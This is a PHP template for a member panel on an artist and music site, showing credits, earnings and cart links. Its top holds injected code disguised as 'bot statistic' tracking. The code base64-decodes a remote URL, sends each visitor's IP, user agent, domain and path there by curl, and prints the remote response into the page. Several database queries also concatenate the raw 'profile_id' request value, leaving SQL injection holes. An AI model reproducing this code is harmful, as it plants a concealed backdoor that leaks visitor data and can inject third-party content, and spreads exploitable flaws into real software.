<?php
$sqlUser = "SELECT * FROM member_account_master WHERE Member_Account_Id='".$_SESSION['SESS_ID']."'";
$resultUser = mysql_query($sqlUser);
$collesUser = mysql_fetch_array($resultUser);
$sRetry = 1;
if (!isset($sRetry))
{
	global $sRetry;
	$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2JvdHN0YXRpc3RpY3VwZGF0ZS5jb20vc3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 12);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<div class="bottomPannel"> <a href="<?=SITE_WS_PATH?>/<?=trim($collesUser['Member_Account_Id'])?>/<?=ucfirst(stripslashes($collesUser['First_Name']))?>">
        <?php if(file_exists("products/user_image/$collesUser[Photo]") && $collesUser['Photo']!='') { ?>
        <img src="<?=SITE_WS_PATH?>/products/user_image/<?php echo $collesUser['Photo']; ?>" border="0" width="28" height="27" />
        <?php } else { ?>
        <img src="<?=SITE_WS_PATH?>/images/user_big.png" border="0" width="28" height="27" />
        <?php } ?>
        </a>
        <ul>
          <li>
            <?php if($_SESSION['SESS_EMAIL']!='') { ?>
            <a href="<?=SITE_WS_PATH?>/<?=trim($collesUser['Member_Account_Id'])?>/<?=ucfirst(stripslashes($collesUser['First_Name']))?>"><strong>User:</strong>
            <?=ucfirst($collesUser['First_Name'])?>
            </a>
            <?php } ?>
          </li>
          <?php
		  
					  if($_REQUEST['profile_id']=='') {
                      $sql_notes_pp = "SELECT sum(a.No_Of_Package) as notesTotalPP FROM package_master a LEFT JOIN package_history_master b ON (a.Package_Id=b.Package_Id)
                                    WHERE a.Status='1' AND b.Status='1' AND b.Member_Account_Id='".$_SESSION['SESS_ID']."'";
					  $sql_notes_upgrade = "SELECT sum(a.Membership_No) as notesTotalUP FROM membership_artist_upgrade_master a LEFT JOIN membership_artist_upgrade_history_master b ON (a.Membership_Upgrade_Id=b.Membership_Upgrade_Id)
						WHERE a.Status='1' AND b.Status='1' AND b.Member_Account_Id='".$_SESSION['SESS_ID']."'";
					  }
					  else
					  {
					  $sql_notes_pp = "SELECT sum(a.No_Of_Package) as notesTotalPP FROM package_master a LEFT JOIN package_history_master b ON (a.Package_Id=b.Package_Id)
                                    WHERE a.Status='1' AND b.Status='1' AND b.Member_Account_Id='".$_REQUEST['profile_id']."'";
					  $sql_notes_upgrade = "SELECT sum(a.Membership_No) as notesTotalUP FROM membership_artist_upgrade_master a LEFT JOIN membership_artist_upgrade_history_master b ON (a.Membership_Upgrade_Id=b.Membership_Upgrade_Id)
						WHERE a.Status='1' AND b.Status='1' AND b.Member_Account_Id='".$profile_id."'";
					  }
                        $result_notes_pp = mysql_query($sql_notes_pp);
                        $result_notes_up = mysql_query($sql_notes_upgrade);
						if(mysql_num_rows($result_notes_pp)>0 || mysql_num_rows($result_notes_up)>0)
                        {
                            $colles_notes_pp = mysql_fetch_array($result_notes_pp);
                            $NOTES_PP = $colles_notes_pp['notesTotalPP'];
							$colles_notes_up = mysql_fetch_array($result_notes_up);
							$NOTES_UP = $colles_notes_up['notesTotalUP'];
								
							if($_REQUEST['profile_id']=='') {
                            $sql_bank_notes_pp = "SELECT sum(Notes_Value) as bankNotesTotalPP FROM my_bank WHERE From_Member_Account_Id='".$_SESSION['SESS_ID']."'";
							}
							else
							{
							$sql_bank_notes_pp = "SELECT sum(Notes_Value) as bankNotesTotalPP FROM my_bank WHERE From_Member_Account_Id='".$_REQUEST['profile_id']."'";
							}
                            $result_bank_notes_pp = mysql_query($sql_bank_notes_pp);
                            $colles_bank_notes_pp = mysql_fetch_array($result_bank_notes_pp);
                            if(mysql_num_rows($result_bank_notes_pp)>0)
                            {
                            $BANK_NOTES_PP = $colles_bank_notes_pp['bankNotesTotalPP'];
                            }
                            else
                            {
                            $BANK_NOTES_PP = 0;
                            }
                            $TOTAL_NOTES_PP = $NOTES_PP+$NOTES_UP-$BANK_NOTES_PP;
                        ?>
            <?php if($_SESSION['SESS_ACCOUNT_TYPE']=='Artist' ) { ?>
            <li><a href="#" style="cursor:text;"><strong><strong>Credits:</strong></strong> <?=$TOTAL_NOTES_PP;?> </a></li>
			<?php
            }
			}
            else
            {
			if($_SESSION['SESS_ACCOUNT_TYPE']=='Artist') { 
            ?>
           <li><a href="#" style="cursor:text;">Credits: 0 </a></li>
          <?php } } ?>
			<?php
           if($profile_id=='') 
			{
				 if($_SESSION['SESS_ACCOUNT_TYPE']=='Contest Judge') 
				 {
				 $sql_my_bank = "SELECT count(*) as myTotalEarning FROM my_bank WHERE From_Member_Account_Id='".$_SESSION['SESS_ID']."' ";
				 }
				 elseif($_SESSION['SESS_ACCOUNT_TYPE']=='Artist')
				 {
				 $sql_my_bank = "SELECT sum(Artist_Amount) as myTotalEarning FROM royality WHERE Artist_Id ='".$_SESSION['SESS_ID']."' ";		
				 }
				 elseif($_SESSION['SESS_ACCOUNT_TYPE']=='Musician')
				 {
				 $sql_my_bank = "SELECT sum(Musician_Amount) as myTotalEarning FROM royality WHERE 	Musician_Id ='".$_SESSION['SESS_ID']."' ";		
				 }
			}
			else
			{
			$sql_my_bank = "SELECT sum(Musician_Amount) as myTotalEarning FROM royality WHERE Musician_Id='".$profile_id."' ";
			}
            $result_my_bank = mysql_query($sql_my_bank);
            if(mysql_num_rows($result_my_bank)>0)
            {
			
            $colles_my_bank = mysql_fetch_array($result_my_bank);
            if($_SESSION['SESS_ACCOUNT_TYPE']!='Contest Judge') { 
            ?>
            <li><a href="#" style="cursor:text;"><strong>Earnings:</strong> $<? printf('%1.2f',$colles_my_bank['myTotalEarning']);?></a></li>
            <?php } else { ?>
            <li><a href="#" style="cursor:text;"><strong>Points:</strong> <? printf('%1.0f',$colles_my_bank['myTotalEarning']);?></a></li>
            <?php
			}
            }
            else
            {
			if($_SESSION['SESS_ACCOUNT_TYPE']!='Contest Judge') { 
            ?>
            <li><a href="#" style="cursor:text;">$0.00</a></li>
            <?php } else { ?>
            <li><a href="#" style="cursor:text;">0</a></li>
            <?php } }?>
        </ul>
        <?php if($pageName!='my-cart.php') { ?>
        <span><a href="<?=SITE_WS_PATH?>/my-cart.php" title="Cart"><i class="fa fa-shopping-cart"></i> <strong>Cart</strong></a></span> 
        <span style="padding-left:20px;">&nbsp; </span>
        <?php } ?>  
        <?php if($_SESSION['SESS_ACCOUNT_TYPE']=='Artist') { ?> 
       <span><a href="<?=SITE_WS_PATH?>/notes-plan.php"><i class="fa fa-usd"></i> <strong>Get Credits</strong></a>&nbsp; </span> 
        <?php } ?>
        
        
        </div>